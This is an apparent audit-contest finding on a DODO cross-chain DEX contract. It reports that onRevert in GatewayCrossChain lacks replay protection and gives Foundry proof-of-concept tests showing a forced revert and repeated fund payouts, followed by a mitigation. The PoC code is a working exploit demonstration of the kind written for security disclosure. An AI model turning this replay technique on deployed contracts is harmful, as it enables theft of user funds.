# Unchecked `onRevert` in `GatewayCrossChain` Allows Unlimited Fund Withdrawal

## Summary

An attacker can interact with the [`GatewayCrossChain`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol) contract and manipulate gass to trigger a Revert on [`function onCall()`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L442-L510) on the destination chain. This can enable any entity with `Gateway` access control to perform replay attacks on the `function onRevert`  itself, leading to repeated token transfers.

## Root Cause

The main vulnerability is in the [`function onRevert`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L517-L548), which lacks protection and ignores the [check-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html) pattern. This is also not a best practice according to the [`zetachain documentation`](https://www.zetachain.com/docs/developers/chains/zetachain/#revert-transactions). The documentation does not explicitly mention the use of IDs, therefore protection is also an independent decision by the developer.

```solidity
517:        function onRevert(RevertContext calldata context) external onlyGateway {
518:            // 52 bytes = 32 bytes externalId + 20 bytes evmWalletAddress
519:            bytes32 externalId = bytes32(context.revertMessage[0:32]);
520:            bytes memory walletAddress = context.revertMessage[32:];
521:
522:            if(context.revertMessage.length == 52) {
523:                address receiver = address(uint160(bytes20(walletAddress)));
524:                TransferHelper.safeTransfer(context.asset, receiver, context.amount);

526:                emit EddyCrossChainRevert(
527:                    externalId,

532:            } else {
533:                RefundInfo memory refundInfo = RefundInfo({
```

## Impact

An attacker with `Gateway` Access Control can perform replay attacks on `onRevert` repeatedly. In the worst-case scenario, the attack could continue until all funds in the contract are depleted.

> **Note**: The [README](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/README.md) states that the only trusted entities are `Owner`, `Bot`, and `EddyTreasurySafe` with limitations. `GatewayZEVM` or similar entities are not included as trustable entities, yet in the codebase, these entities are implemented as trusted entities. The `function onRevert` has no protection against them, which is certainly not a safe design implementation.

## Proof Of Concept

We have conducted tests to prove whether such attacks can be realistically performed in 2 step:

### Step one

Apply the following function at the end of [`omni-chain-contracts/test/GatewayCrossChain.t.sol`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/test/GatewayCrossChain.t.sol) to prove that an attacker can deliberately trigger a `Revert` on the destination chain:

Run the test with the command `forge test --match-test test_DeliberateGasFailure -vvvv`

```solidity
    function test_DeliberateGasFailure() public {
        vm.startPrank(address(0x1));
        
        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
        address zrc20 = address(token1Z);
        uint256 amount = 100 ether;
        
        uint32 dstChainId = 2;
        address targetZRC20 = address(token2Z);
        bytes memory sender = abi.encodePacked(user1);
        bytes memory receiver = abi.encodePacked(user2);
        bytes memory swapDataZ = "";
        bytes memory contractAddress = abi.encodePacked(address(0xABCD));
        bytes memory fromTokenB = abi.encodePacked(address(0xF000));
        bytes memory toTokenB = abi.encodePacked(address(0xF001));
        bytes memory swapDataB = abi.encodePacked(new bytes(1000));
        bytes memory accounts = "";
        
        bytes memory payload = abi.encodePacked(
            bytes4(dstChainId),
            bytes20(targetZRC20),
            uint16(sender.length),
            uint16(receiver.length),
            uint16(swapDataZ.length),
            uint16(contractAddress.length),
            uint16(bytes.concat(fromTokenB, toTokenB, swapDataB).length),
            uint16(accounts.length),
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            bytes.concat(fromTokenB, toTokenB, swapDataB),
            accounts
        );
        
        vm.stopPrank();
        
        vm.mockCall(
            address(targetZRC20),
            abi.encodeWithSelector(IZRC20.withdrawGasFeeWithGasLimit.selector, gatewayCrossChain.gasLimit()),
            abi.encode(address(targetZRC20), amount)
        );
        
        token1Z.mint(address(gatewayCrossChain), amount);
        
        bytes4 selector = bytes4(keccak256("NotEnoughToPayGasFee()"));
        vm.expectRevert(selector);
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onCall(
            MessageContext({
                origin: "",
                sender: user1,
                chainID: 1
            }),
            zrc20,
            amount,
            bytes.concat(externalId, payload)
        );
        
        vm.prank(address(gatewayZEVM));
        try gatewayCrossChain.onRevert(
            RevertContext({
                sender: address(user1),
                asset: address(token1Z),
                amount: amount,
                revertMessage: bytes.concat(externalId, abi.encodePacked(user2))
            })
        ) {
            assertEq(token1Z.balanceOf(user2), amount, "Funds should have been transferred to user2");
        } catch {
            vm.prank(address(gatewayZEVM));
            gatewayCrossChain.onAbort(
                AbortContext({
                    sender: abi.encode(user1),
                    asset: address(token1Z),
                    amount: amount,
                    outgoing: false,
                    chainID: 7000,
                    revertMessage: bytes.concat(externalId, abi.encodePacked(user2))
                })
            );
            
            (bytes32 storedExternalId, address storedToken, uint256 storedAmount, bytes memory storedWalletAddress) = gatewayCrossChain.refundInfos(externalId);
            assertEq(storedExternalId, externalId, "Refund not correctly recorded");
            assertEq(storedToken, address(token1Z), "Refund token mismatch");
            assertEq(storedAmount, amount, "Refund amount mismatch");
            assertEq(keccak256(storedWalletAddress), keccak256(abi.encodePacked(user2)), "Refund receiver mismatch");
            
            uint256 contractBalance = token1Z.balanceOf(address(gatewayCrossChain));
            assertEq(contractBalance, amount, "Funds should remain in the contract until claimed");
            
            uint256 user2Balance = token1Z.balanceOf(user2);
            assertEq(user2Balance, 0, "User should not have received funds yet");
            
            vm.startPrank(user1);
            vm.expectRevert("INVALID_CALLER");
            gatewayCrossChain.claimRefund(externalId);
            vm.stopPrank();
        }
    }
```

### Step two

Apply the following function at the end of [`omni-chain-contracts/test/GatewayCrossChain.t.sol`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/test/GatewayCrossChain.t.sol) to prove that an attacker with `Gateway` Access control can perform replay attacks on the `function onRevert`:

Run the test with the command `forge test --match-test test_ReplayAttackOnRevert -vvvv`

```solidity
    function test_ReplayAttackOnRevert() public {
        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
        uint256 amount = 100 ether;
        
        token1Z.mint(address(gatewayCrossChain), amount * 3);
        
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onRevert(
            RevertContext({
                sender: address(this),
                asset: address(token1Z),
                amount: amount,
                revertMessage: bytes.concat(externalId, bytes20(user2))
            })
        );
        
        assertEq(token1Z.balanceOf(user2), amount, "User should receive tokens after first onRevert");
        
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onRevert(
            RevertContext({
                sender: address(this),
                asset: address(token1Z),
                amount: amount,
                revertMessage: bytes.concat(externalId, bytes20(user2))
            })
        );
        
        assertEq(token1Z.balanceOf(user2), amount * 2, "User should receive tokens again after replay");
        
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onRevert(
            RevertContext({
                sender: address(this),
                asset: address(token1Z),
                amount: amount,
                revertMessage: bytes.concat(externalId, bytes20(user2))
            })
        );
        
        assertEq(token1Z.balanceOf(user2), amount * 3, "User should receive tokens again after second replay");
    }
```

## Mitigation

Protect the `function onRevert` by implementing the [check-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html) pattern as already implemented in the [`function claimRefund`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571-L590).
